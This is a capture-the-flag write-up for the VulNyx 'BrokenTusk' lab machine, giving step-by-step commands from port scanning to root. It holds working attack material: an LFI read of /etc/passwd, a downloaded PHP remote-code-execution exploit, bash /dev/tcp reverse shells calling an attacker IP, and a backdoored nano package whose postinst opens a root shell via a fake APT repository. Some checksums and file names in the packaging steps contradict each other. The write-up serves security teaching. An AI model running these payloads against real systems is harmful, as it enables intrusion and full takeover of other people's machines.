# [VulNyx](https://vulnyx.com/) – BrokenTusk Writeup

<img width="676" height="436" alt="image" src="https://github.com/user-attachments/assets/2ec2eae1-f51f-41cc-8398-9a4d97d07be6" />


---

## Key Vulnerabilities

- **Local File Inclusion (LFI):** The `page` parameter in `vuln.php` allows local file access.
- **PHP2Shell:** PHP request-processing vulnerabilities, identified in the original investigation as CVE-2026-109618 and CVE-2026-109619, provide remote code execution.
- **Credential Disclosure:** A hardcoded Base64-encoded secret in the `passgoblin` binary reveals credentials.
- **APT Repository Poisoning:** Passwordless sudo access to `apt-get update` and `apt-get upgrade`, combined with the proxy configuration and custom repository, enables malicious package installation as root.

---

# 🔎 Enumeration

## 1. Network Discovery and Port Scanning

First, scan the local network using `arp-scan` to identify active hosts. After identifying the target, perform a full TCP port scan with Nmap.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.121
```

### Nmap Results:

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.121
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 22:26 -0700
Nmap scan report for 192.168.1.121
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: BrokenTusk | Wildlife Rescue Foundation
MAC Address: 08:00:27:B1:7F:83 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
```

The scan reveals two open ports:

- **22 – SSH:** OpenSSH service.
- **80 – HTTP:** Nginx web server.

Since port 80 is open, let's inspect the website through a browser.

## 2. Web Enumeration

<img width="1918" height="869" alt="Screenshot_2026-10-31_22_29_43" src="https://github.com/user-attachments/assets/e23c119b-7949-4ee1-8489-9d5b552fe7d6" />

The website title is:

`BrokenTusk | Wildlife Rescue Foundation`

The homepage contains information about the Wildlife Rescue Foundation. Nothing immediately useful is exposed on the main page.

Let's enumerate hidden directories and files using FFUF.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-u http://192.168.1.121/FUZZ \
-fs 26659 -fc 403 -e .php
```

### Results:

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.1.121/FUZZ -fs 26659 -fc 403 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.121/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 26659
________________________________________________

api                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 5ms]
app                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 9ms]
vuln.php                [Status: 200, Size: 223, Words: 28, Lines: 5, Duration: 318ms]
:: Progress: [9502/9502] :: Job [1/1] :: 202 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```

We discovered two directories, `api` and `app`, along with an interesting PHP endpoint named `vuln.php`.

Let's enumerate the `app` directory further.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-u http://192.168.1.121/app/FUZZ.php \
-fs 26659 -fc 403
```

### Results:

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.1.121/app/FUZZ.php -fs 26659  -fc 403 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.121/app/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 26659
________________________________________________

upload                  [Status: 200, Size: 34, Words: 3, Lines: 3, Duration: 382ms]
:: Progress: [4751/4751] :: Job [1/1] :: 443 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

The endpoint `/app/upload.php` is accessible.

<img width="1918" height="862" alt="Screenshot_2026-11-03_08_07_00" src="https://github.com/user-attachments/assets/ae6a467f-9e3d-40e1-9209-853dfe04eeb3" />

However, inspecting it reveals that it is only a demo page.

Let's investigate the previously discovered `vuln.php` endpoint.

---

# 🌐 Local File Inclusion – LFI

Since `vuln.php` is a PHP endpoint, let's check whether it accepts parameters that could lead to Local File Inclusion.

We can use FFUF to identify possible parameter names.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-u 'http://192.168.1.121/vuln.php?FUZZ=/etc/passwd' \
-fs 223
```

## Results:

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.1.121/vuln.php?FUZZ=/etc/passwd -fs 223

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.121/vuln.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 223
________________________________________________

page                    [Status: 200, Size: 1237, Words: 12, Lines: 25, Duration: 154ms]
:: Progress: [4751/4751] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

We discovered a parameter named `page`.

Let's attempt to read `/etc/passwd`.

```bash
curl http://192.168.1.121/vuln.php?page=/etc/passwd
```

### Output:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

The file is successfully disclosed.

We identify two interesting accounts:

- `root`
- `zer0arc4`

The LFI provides useful information about the target's local users. However, we still need a way to execute commands.

---

# 💥 Initial Access – PHP2Shell

## 1. Identify the PHP Version

Let's inspect the HTTP response headers.

```bash
curl -I http://192.168.1.121/
```

### Output:

```text
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 01 Nov 2026 05:54:48 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.0.30
Set-Cookie: PHPSESSID=05e334f69edfbcdb5afea7116f687818; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

The response discloses the PHP version:

```
PHP/8.0.30
```

During the investigation, this version led us to examine the PHP2Shell vulnerability chain.

### CVE-2026-109618 – Out-of-Memory (OOM) Memory Corruption

The vulnerability description used during the investigation identifies an issue in PHP request processing.

An `out-of-memory` condition can interrupt initialization of internal memory structures. If cleanup subsequently handles partially initialized structures incorrectly, memory corruption may occur.

A specially crafted HTTP request may potentially trigger this condition and lead to code execution.

### CVE-2026-109619 – Stale Global State (Use-After-Free)

This vulnerability description concerns stale references in PHP's request-handling and memory-management mechanisms.

Under certain error-handling conditions, references may remain pointed at memory that has already been released. If that memory is reused, subsequent processing may access unintended memory, potentially resulting in memory corruption or code execution.

These are the vulnerability descriptions associated with the PHP2Shell investigation. The PHP version disclosure alone does not prove that either CVE is exploitable; the following test establishes the observed result on this target.

## 2. Download the PHP2Shell Exploit

After testing several available proof-of-concept implementations, the following repository provided an exploit that worked against **BrokenTusk**.

```bash
wget https://raw.githubusercontent.com/ikow/php2shell-poc/refs/heads/main/exploit/chain_a_session_lfi.py
```

## 3. Confirm Remote Code Execution

Run the exploit with the target's HTTP endpoint, the PHP injection path, and the LFI endpoint.

```bash
python3 exploit/chain_a_session_lfi.py \
--host 192.168.1.121 --port 80 \
--inject-path /index.php --lfi-path /vuln.php \
--session-path /tmp/sessions \
--delay 0.05 --attempts 3 --command 'id'
```

### Output:

```text
$ python3 exploit/chain_a_session_lfi.py --host 192.168.1.121 --port 80 --inject-path /index.php --lfi-path /vuln.php --session-path /tmp/sessions --delay 0.05 --attempts 3 --command 'id' 
[*] Target: http://192.168.1.121:80
[*] Command: id

[attempt 1] SID=exploit8018b276a218436d8ccb file=/tmp/sessions/sess_exploit8018b276a218436d8ccb
    plant=HTTP/1.1 200 OK
[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Excellent! Remote command execution is confirmed.

The command executes with the privileges of:

`www-data`

## 4. Obtain a Reverse Shell

Start a Netcat listener on the attacking machine.

```bash
nc -lnvp 4444
```

Direct command injection did not work reliably, so encode the reverse shell payload using Base64.

```bash
echo "bash -i >& /dev/tcp/192.168.1.2/4444 0>&1" | base64
```

**`Encoded payload`:**

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi80NDQ0IDA+JjEK
```

Execute the encoded payload through the PHP2Shell exploit.

```bash
python3 exploit/chain_a_session_lfi.py \
--host 192.168.1.121 --port 80 \
--command 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi80NDQ0IDA+JjEK | base64 -d | bash'
```

### Netcat listener:

```text
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.121] 40864
bash: cannot set terminal process group (685): Inappropriate ioctl for device
bash: no job control in this shell
www-data@BrokenTusk:~/html$
```

We successfully obtained a reverse shell as `www-data`.

---

# 🖥️ Reverse Shell TTY Upgrade

The initial reverse shell is not fully interactive. Let's upgrade it to a proper TTY.

Run:

```bash
script /dev/null -c bash
```

Press `Ctrl + Z`, 
then execute:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the environment variables:

```bash
export TERM=xterm
export BASH=bash
```

Set the terminal dimensions:

```bash
stty cols 160 rows 45
```

Verify the current user and hostname:

```text
www-data@BrokenTusk:~/html$ id ;hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
BrokenTusk
www-data@BrokenTusk:~/html$ 
```

We now have a stable interactive shell as `www-data`.

---

# 🔍 Privilege Escalation – www-data to zer0arc4

## 1. Enumerate Local Users

Let's identify the users with interactive shells.

```bash
cat /etc/passwd | grep bash
```

### Output:

```text
root:x:0:0:root:/root:/bin/bash
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

The machine contains two users with Bash login shells:

- `root`
- `zer0arc4`

Initial enumeration of sudo permissions, SUID binaries, and Linux capabilities did not reveal an obvious privilege escalation path.

Let's manually inspect interesting directories.

## 2. Discover the PassGoblin Binary

Inspect `/opt`.

```bash
ls -la /opt/
```

### Output:

```text
total 28
drwxr-xr-x  3 root root  4096 Oct 31 17:19 .
drwxr-xr-x 18 root root  4096 Oct 31 16:14 ..
-rwxr-xr-x  1 root root 14512 Oct 31 17:19 passgoblin
drwxr-xr-x  5 root root  4096 Nov  1 01:25 php2shell
```

An interesting executable named `passgoblin` is present.

Let's identify the binary.

```bash
file passgoblin
```

### Output:

```text
www-data@BrokenTusk:/opt$ file passgoblin 
passgoblin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=57cc7f52cc88f0795e20dc035d4a2e418c981fb7, for GNU/Linux 3.2.0, stripped
www-data@BrokenTusk:/opt$ 
```

It is a 64-bit dynamically linked ELF executable.

Run it to understand its functionality.

```bash
./passgoblin
```

### Output:

```text
www-data@BrokenTusk:/opt$ ./passgoblin 
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials: 

Access Denied! Invalid Secret Key.
www-data@BrokenTusk:/opt$ 
```

The program identifies its intended user as `zer0arc4` and requests a secret key before displaying credentials.

We don't know the key yet, so let's inspect the binary's printable strings.

## 3. Extract Strings from PassGoblin

```bash
strings passgoblin
```

Among the output, we discover:

```text
ssgoblin 
]J.A
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
strcspn
__libc_start_main
__cxa_finalize
strchr
memset
printf
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
ABCDEFGHH
IJKLMNOPH
QRSTUVWXH
YZabcdefH
ghijklmnH
opqrstuvH
wxyz0123H
456789+/H
ggWelcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials: 
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT
Access Granted!
Username: zer0arc4
Password: %s
The key said hello, the password said goodbye to its privacy.
Access Denied! Invalid Secret Key.
;*3$"
GCC: (Debian 16.2.0-1) 16.2.0
.shstrtab
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.gnu.property
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

An interesting Base64-encoded string is embedded in the executable.

```text
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU1M
```

Let's decode it.

```bash
echo "Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU1M" | base64 -d
```

#### Decoded output:

We have discovered the secret key:

```text
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
```

## 4. Retrieve zer0arc4 Credentials

Run the binary again and provide the discovered secret key.

```bash
./passgoblin
```

**Input:**

```text
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
```

### Output:

```text
www-data@BrokenTusk:/opt$ ./passgoblin 
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials: COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS

Access Granted!
Username: zer0arc4
Password: TooBigToHide123!

The key said hello, the password said goodbye to its privacy.
www-data@BrokenTusk:/opt$
```

We successfully recovered the credentials:

| Field | Value |
|---|---|
| Username | `zer0arc4` |
| Password | `TooBigToHide123!` |

## 5. SSH Access as zer0arc4

Use the recovered credentials to connect over SSH.

```bash
ssh zer0arc4@192.168.1.121
```

Verify the session.

```text
$ ssh zer0arc4@192.168.1.121
zer0arc4@192.168.1.121's password: 
Linux BrokenTusk 6.12.113+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.113-1 (2026-10-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
zer0arc4@BrokenTusk:~$ id ; hostname
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
BrokenTusk
zer0arc4@BrokenTusk:~$
```

We have successfully moved from `www-data` to the local user `zer0arc4`.

---

# 👑 Privilege Escalation – zer0arc4 to Root

## 1. Enumerate Sudo Permissions

Let's inspect the commands that `zer0arc4` can execute with sudo.

```bash
sudo -l
```

### Output:

```text
Matching Defaults entries for zer0arc4 on BrokenTusk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User zer0arc4 may run the following commands on BrokenTusk:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

Interesting!

The user can execute the following commands as any user, including root, without providing a password:

```text
/usr/bin/apt-get update
/usr/bin/apt-get upgrade
```

This becomes the key to the final privilege escalation.

## 2. Investigate APT Configuration

The target uses Debian package repositories. Let's inspect the configured APT sources.

```bash
cat /etc/apt/sources.list
```

### Output:

```text
zer0arc4@BrokenTusk:~$ cat /etc/apt/sources.list
deb http://deb.debian.org/debian/ trixie main non-free-firmware
deb-src http://deb.debian.org/debian/ trixie main non-free-firmware

deb http://security.debian.org/debian-security trixie-security main non-free-firmware
deb-src http://security.debian.org/debian-security trixie-security main non-free-firmware

deb http://deb.debian.org/debian/ trixie-updates main non-free-firmware
deb-src http://deb.debian.org/debian/ trixie-updates main non-free-firmware
```

Now inspect the additional repository configuration.

```bash
cat /etc/apt/sources.list.d/brokentusk.list
```

**Output:**

```text
zer0arc4@BrokenTusk:~$ cat /etc/apt/sources.list.d/brokentusk.list 
# BrokenTusk custom package repository
deb http://package.brokentusk.nyx/debian/ trixie main
zer0arc4@BrokenTusk:~$ 
```

This is interesting. The machine has an additional custom APT repository:

```
package.brokentusk.nyx
```

The idea is to investigate whether package downloads from this repository can be redirected through a proxy and served from an attacker-controlled repository.

The relevant technique is APT man-in-the-middle package injection. The following article was useful during the investigation:

[APT MiTM (Man-in-The-Middle) Package Injection – Versprite](https://versprite.com/resources/vs-labs/apt-mitm-package-injection/)

## 3. Configure the Local Repository Hostname

On the attacking machine, the intended repository hostname needs to resolve to the attacker's IP address.

The attacking machine's IP is: `192.168.1.2`

The notes show the following `/etc/hosts` entry:

```text
192.168.1.2   package.brokentusk.nyx
```

This hostname must match the repository hostname in the target's APT source file.

## 4. Identify an Installed Package

We need a package that is already installed on the target and can be offered at a higher version through our custom repository.

Let's use `nano`.

Check whether it is installed:

```bash
dpkg -l | grep nano
```

### Output:

```text
zer0arc4@BrokenTusk:~$ dpkg -l | grep nano
ii  nano                             8.4-1+deb13u1                        amd64        small, friendly text editor inspired by Pico
zer0arc4@BrokenTusk:~$
```

Inspect its package metadata:

```bash
apt-cache show nano
```

Relevant information:

```text
zer0arc4@BrokenTusk:~$ apt-cache show nano
Package: nano
Version: 8.4-1+deb13u1
Installed-Size: 2839
Maintainer: Jordi Mallach <jordi@debian.org>
Architecture: amd64
Replaces: nano-tiny (<< 2.8.6-2), pico
Depends: libc6 (>= 2.38), libncursesw6 (>= 6), libtinfo6 (>= 6)
Suggests: hunspell
Conflicts: pico
Breaks: nano-tiny (<< 2.8.6-2)
Description-en: small, friendly text editor inspired by Pico
 GNU nano is an easy-to-use text editor originally designed as a replacement
 for Pico, the ncurses-based editor from the non-free mailer package Pine
 (itself now available under the Apache License as Alpine).
 .
 However, GNU nano also implements many features missing in Pico, including:
  - undo/redo
  - line numbering
  - syntax coloring
  - soft-wrapping of overlong lines
  - selecting text by holding Shift
  - interactive search and replace (with regular expression support)
  - a go-to line (and column) command
  - support for multiple file buffers
  - auto-indentation
  - tab completion of filenames and search terms
  - toggling features while running
  - and full internationalization support
Description-md5: af29527665aea4297c3c5acbb24cf1fa
Homepage: https://www.nano-editor.org/
Tag: implemented-in::c, interface::text-mode, role::program, scope::utility,
 suite::gnu, uitoolkit::ncurses, use::editing, works-with::text
Section: editors
Priority: important
Filename: pool/main/n/nano/nano_8.4-1+deb13u1_amd64.deb
Size: 644672
MD5sum: 4aec65bf01a7b4fb66edfb4aa418304f
SHA256: 38d496c9e432ca38ef386f6d832f5c18d6a0a48c78d6711223ca1541f4306a04
```

The installed version is:

```
8.4-1+deb13u1
```

We can prepare a package with a higher version number so that APT considers it an available upgrade.

## 5. Download and Extract the Original Package

Download the original Debian package on your local machine.

```bash
wget http://ftp.de.debian.org/debian/pool/main/n/nano/nano_8.4-1+deb13u1_amd64.deb
```

Verify the downloaded file:

```bash
file nano_8.4-1+deb13u1_amd64.deb
```

### Output:

```text
$ file nano_8.4-1+deb13u1_amd64.deb     
nano_8.4-1+deb13u1_amd64.deb: Debian binary package (format 2.0), with control.tar.xz , data compression xz
```

Extract the package contents:

```bash
dpkg-deb -R nano_8.4-1+deb13u1_amd64.deb extracted-nano
```

The extracted directory contains:

```text
$ ls -la extract
total 20
drwxr-xr-x 5 arc arc 4096 Nov  1 08:41 .
drwxrwxr-x 4 arc arc 4096 Nov  1 08:41 ..
drwxr-xr-x 2 arc arc 4096 May  3 16:17 DEBIAN
drwxr-xr-x 2 arc arc 4096 May  3 16:17 etc
drwxr-xr-x 4 arc arc 4096 May  3 16:17 usr
```

## 6. Modify the Package's Post-Installation Script

Debian packages can contain maintainer scripts that execute during package installation.

The `postinst` script is executed after the package has been unpacked and configured.

So now lets add the reverse shell payload in it .

The modified postinst show the following payload:

```bash
#!/bin/sh

bash -c 'bash -i > /dev/tcp/192.168.1.2/4444 0>&1'
```

The script was made executable:

```bash
chmod 755 extracted-nano/DEBIAN/postinst
```

## 7. Increase the Package Version

Edit the package control file:

```bash
nano extracted-nano/DEBIAN/control
```

The package version was changed to:

```text
Package: nano
Version: 8.5-1+deb13u2
Architecture: amd64
Maintainer: Jordi Mallach <jordi@debian.org>
Installed-Size: 2839
Depends: libc6 (>= 2.38), libncursesw6 (>= 6), libtinfo6 (>= 6)
Suggests: hunspell
Conflicts: pico
Breaks: nano-tiny (<< 2.8.6-2)
Replaces: nano-tiny (<< 2.8.6-2), pico
Section: editors
```

This makes the custom package version `8.5-1+deb13u2 ` which is higher than the installed version.

## 8. Rebuild the Modified Package

Build the modified package:

```bash
dpkg-deb --build extracted-nano nano_8.5-1+deb13u2_amd64.deb
```

The resulting package is:

```text
$ dpkg-deb --build extract nano_8.5-1+deb13u2_amd64.deb 

dpkg-deb: warning: root directory extract has unusual owner or group 1000:1000
dpkg-deb: hint: you might need to pass --root-owner-group, see <https://wiki.debian.org/Teams/Dpkg/RootlessBuilds> for further details
dpkg-deb: warning: ignoring 1 warning about the control file(s)
dpkg-deb: building package 'nano' in 'nano_8.5-1+deb13u2_amd64.deb'.

$ ls -la                                                     
total 1280
drwxrwxr-x 4 arc  arc    4096 Nov  3 01:47 .
drwxrwxr-x 5 arc  arc    4096 Nov  3 01:35 ..
drwxr-xr-x 5 arc  arc    4096 Nov  3 01:40 extract
-rw-rw-r-- 1 arc  arc  644672 May 10 10:19 nano_8.4-1+deb13u1_amd64.deb
-rw-r--r-- 1 root root 644192 Nov  3 01:47 nano_8.5-1+deb13u2_amd64.deb
```

we can see that the new Version file is created.


---

# 📦 Building the Fake APT Repository

The target's repository configuration specifies,
Its name will be `debian` as we saw in the sources list :

```text
deb http://package.brokentusk.nyx/debian/ trixie main
```

Therefore, the repository needs to follow the Debian repository directory structure.

## 1. Create the Repository Directories

```bash
mkdir -p debian/dists/trixie/main/binary-amd64
mkdir -p debian/pool/main/n/nano
```

Copy the modified package into the package pool:

```bash
cp nano_8.5-1+deb13u2_amd64.deb debian/pool/main/n/nano/.
```

## 2. Create the Packages Metadata

APT uses a `Packages` index to identify available packages and their metadata.
Get the stuff from the official site `https://deb.debian.org/debian/dists/trixie/main/binary-amd64/Packages.gz` and Extract the nano packages from it. 

The metadata includes:

- Package name
- Version
- Architecture
- Package filename
- Package size
- MD5 checksum
- SHA256 checksum
- Dependencies

The package metadata must accurately describe the actual `.deb` file.


Generate the checksums with:

```bash
$ md5sum nano_8.5-1+deb13u2_amd64.deb
d52fd04e42acbdffe58e8b88226c35b3  nano_8.5-1+deb13u1_amd64.deb

$ sha256sum nano_8.5-1+deb13u2_amd64.deb
9c5dab352340400325e48618d7fa30ad877ac201f566f9e4794623f50dcaac9d  nano_8.5-1+deb13u1_amd64.deb

$ ls -la nano_8.5-1+deb13u2_amd64.deb 
-rw-r--r-- 1 arc arc 644192 Nov  3 01:53 nano_8.5-1+deb13u1_amd64.deb
```

The intended metadata for this package is:

```text
Package: nano
Version: 8.5-1+deb13u2
Installed-Size: 2839
Maintainer: Jordi Mallach <jordi@debian.org>
Architecture: amd64
Replaces: nano-tiny (<< 2.8.6-2), pico
Depends: libc6 (>= 2.38), libncursesw6 (>= 6), libtinfo6 (>= 6)
Suggests: hunspell
Conflicts: pico
Breaks: nano-tiny (<< 2.8.6-2)
Description: small, friendly text editor inspired by Pico
Homepage: https://www.nano-editor.org/
Description-md5: af29527665aea4297c3c5acbb24cf1fa
Tag: implemented-in::c, interface::text-mode, role::program, scope::utility,
 suite::gnu, uitoolkit::ncurses, use::editing, works-with::text
Section: editors
Priority: important
Filename: pool/main/n/nano/nano_8.5-1+deb13u2_amd64.deb
Size: 644632
MD5sum: 9c93fc0ad82502908304bde2581ee672
SHA256: 01e23fa2c7d4797bd887f3ee3b9758b639e984438fcdb64042b7dabb74a70c4b
```

**Important:** The checksum and size values must be generated from the final rebuilt `nano_8.5-1+deb13u1_amd64.deb` file. Do not reuse the original package's metadata or guessed values.

Save the metadata in:

```text
debian/dists/trixie/main/binary-amd64/Packages
```

Compress the index:

```bash
gzip -k debian/dists/trixie/main/binary-amd64/Packages
```

## 3. Final Repository Structure

The intended repository layout is:

```text
debian/
├── dists/
│   └── trixie/
│       └── main/
│           └── binary-amd64/
│               ├── Packages
│               └── Packages.gz
└── pool/
    └── main/
        └── n/
            └── nano/
                └── nano_8.5-1+deb13u2_amd64.deb
```

The repository path matches the target's configured distribution and component:

- Distribution: `trixie`
- Component: `main`
- Architecture: `amd64`

---

# 🌐 Proxy Configuration and Package Delivery

## 1. Start the Proxy Listener

Start Burp Suite and configure its proxy listener on port:`9999`

Configure the listener to accept connections from the target lab machine.

<img width="1918" height="938" alt="Screenshot_2026-11-03_02_15_33" src="https://github.com/user-attachments/assets/5fdff933-a88d-4e1d-a971-ae3eb75c8dea" />

<img width="765" height="448" alt="Screenshot_2026-11-03_02_15_52" src="https://github.com/user-attachments/assets/26cbe42f-24b2-4254-bf05-b693255b2ce0" />

<img width="809" height="454" alt="Screenshot_2026-11-03_02_16_08" src="https://github.com/user-attachments/assets/77ff4f21-518f-4521-b1c0-b8de08bae110" />



## 2. Start the HTTP Server

From the directory `~/Lab/vunlxy/BrokenTusk` containing the `debian` repository, start a Python HTTP server.

```bash
sudo python3 -m http.server 8000
```

### Output:

```text
Serving HTTP on 0.0.0.0 port 8000
(http://0.0.0.0:8000/) ...
```

This serves the custom repository files.


## 3. Start the Reverse Shell Listener

Open another terminal on the attacking machine.

```bash
nc -lnvp 4444
```

## 4. Configure the Proxy on the Target

Return to the SSH session as `zer0arc4`.

Set the HTTP proxy environment variable:

```bash
export http_proxy=http://192.168.1.2:9999/
```

OutPut:
```text
zer0arc4@BrokenTusk:~$ export http_proxy=http://192.168.1.2:9999/
zer0arc4@BrokenTusk:~$
```

The goal is to route the target's HTTP APT requests through the attacking machine's proxy.

## 5. Update the APT Package Lists

Run:

```bash
sudo apt-get update
```

The target attempts to retrieve repository metadata.

### Output:
```
zer0arc4@BrokenTusk:~$ sudo apt-get update 
Ign:1 http://package.brokentusk.nyx/debian trixie InRelease
Ign:2 http://package.brokentusk.nyx/debian trixie Release                                                   
Ign:3 http://package.brokentusk.nyx/debian trixie/main amd64 Packages                                       
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                                         
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                                       
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US                                    
Ign:3 http://package.brokentusk.nyx/debian trixie/main amd64 Packages                                       
